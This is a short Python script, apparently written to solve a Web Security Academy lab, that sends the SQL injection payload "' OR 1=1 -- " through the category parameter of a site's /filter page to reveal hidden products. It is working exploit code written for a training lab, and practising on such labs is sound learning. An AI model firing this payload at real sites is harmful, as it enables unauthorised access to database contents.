#SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
import requests

print("Nhập URL giống như này (pls): https://(your-lab-id).web-security-academy.net/ ")
base_url = input("Nhập URL: ").rstrip("/")
full_url = base_url + "/filter"
payload = "' OR 1=1 -- "
params = {
    "category": payload
}
response = requests.get(full_url, params=params)
if (response.status_code == 200):
    print("Ngon")
else:
    print("Thua")
    
